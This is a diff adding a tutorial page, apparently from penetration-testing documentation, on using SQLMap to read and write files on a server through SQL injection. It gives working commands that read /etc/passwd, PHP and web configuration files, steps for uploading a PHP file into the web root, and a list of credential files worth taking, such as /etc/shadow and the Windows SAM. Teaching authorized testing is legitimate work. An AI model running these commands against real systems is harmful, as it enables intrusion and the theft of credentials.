@@ -1,0 +1,153 @@
+---
+title: File System Access
+description: Learn how to use SQLMap to access the target's file system
+---
+
+# File System Access with SQLMap
+
+SQLMap provides powerful capabilities to interact with the target server's file system through SQL injection vulnerabilities. This section covers how to read, write, and execute files on the target system.
+
+<Note title="Warning" type="danger">
+These techniques should only be used with explicit permission during authorized penetration testing. Unauthorized access to file systems is illegal in most jurisdictions.
+</Note>
+
+## Reading Files
+
+<Tabs defaultValue="basic" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="basic">Basic Usage</TabsTrigger>
+    <TabsTrigger value="advanced">Advanced Options</TabsTrigger>
+    <TabsTrigger value="examples">Real-World Examples</TabsTrigger>
+  </TabsList>
+  <TabsContent value="basic">
+    ### Basic File Reading
+
+    To read files from the target system, use the `--file-read` parameter:
+
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd"
+    ```
+
+    SQLMap will attempt to retrieve the specified file using the SQL injection vulnerability. The file will be stored in the output directory (default: `~/.sqlmap/output/`).
+  </TabsContent>
+  <TabsContent value="advanced">
+    ### Advanced File Reading Options
+
+    SQLMap offers several options to customize file reading:
+
+    ```bash
+    # Read multiple files
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" --file-read="/etc/hosts"
+
+    # Specify output directory
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" -o
+
+    # Use a specific technique
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" --technique=E
+    ```
+
+    The `-o` flag enables all optimization features, which can help with retrieving larger files more efficiently.
+  </TabsContent>
+  <TabsContent value="examples">
+    ### Real-World Examples
+
+    During penetration testing, you might want to retrieve configuration files that could contain sensitive information:
+
+    ```bash
+    # Web server configuration
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/apache2/apache2.conf"
+
+    # PHP configuration
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/php/7.4/apache2/php.ini"
+
+    # Web application configuration
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/var/www/html/config.php"
+    ```
+
+    These files often contain database credentials, API keys, and other sensitive information.
+  </TabsContent>
+</Tabs>
+
+## Writing Files
+
+<Stepper>
+  <StepperItem title="Prepare Your File">
+    First, create the file you want to upload to the target system. For example, a simple PHP info script:
+    
+    ```php
+    <?php phpinfo(); ?>
+    ```
+    
+    Save this as `info.php` on your local machine.
+  </StepperItem>
+  <StepperItem title="Upload the File">
+    Use the `--file-write` and `--file-dest` parameters to upload the file:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --file-write="info.php" --file-dest="/var/www/html/info.php"
+    ```
+    
+    SQLMap will attempt to write your local file to the specified destination on the target server.
+  </StepperItem>
+  <StepperItem title="Verify the Upload">
+    After uploading, verify that the file was successfully written by accessing it through the web browser:
+    
+    ```
+    http://target.com/info.php
+    ```
+    
+    If the PHP info page displays, the file was successfully uploaded and is executable.
+  </StepperItem>
+</Stepper>
+
+## Common File System Targets
+
+When accessing a target's file system, certain files and directories are particularly valuable for penetration testers:
+
+<div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6">
+  <div className="border rounded-md p-4">
+    <h3 className="text-lg font-semibold">Linux Systems</h3>
+    <ul className="list-disc pl-5 mt-2">
+      <li>/etc/passwd - User accounts</li>
+      <li>/etc/shadow - Password hashes</li>
+      <li>/etc/hosts - Host mappings</li>
+      <li>/etc/apache2/apache2.conf - Web server config</li>
+      <li>/var/www/html/ - Web root directory</li>
+    </ul>
+  </div>
+  <div className="border rounded-md p-4">
+    <h3 className="text-lg font-semibold">Windows Systems</h3>
+    <ul className="list-disc pl-5 mt-2">
+      <li>C:\Windows\System32\drivers\etc\hosts</li>
+      <li>C:\inetpub\wwwroot\web.config</li>
+      <li>C:\Windows\win.ini</li>
+      <li>C:\Windows\repair\sam</li>
+      <li>C:\xampp\htdocs\ - Common web root</li>
+    </ul>
+  </div>
+</div>
+
+## Directory Structure Example
+
+Below is an example of a typical web application directory structure you might encounter:
+
+```
+/var/www/html/
+├── index.php
+├── config/
+│   ├── database.php
+│   └── settings.php
+├── includes/
+│   ├── header.php
+│   └── footer.php
+├── assets/
+│   ├── css/
+│   ├── js/
+│   └── images/
+└── uploads/
+    └── user_files/
+```
+
+<Note title="Pro Tip" type="success">
+When exploring a target's file system, start with configuration files as they often contain credentials and other sensitive information. Web server logs can also reveal valuable information about the application's behavior and potential vulnerabilities.
+</Note>
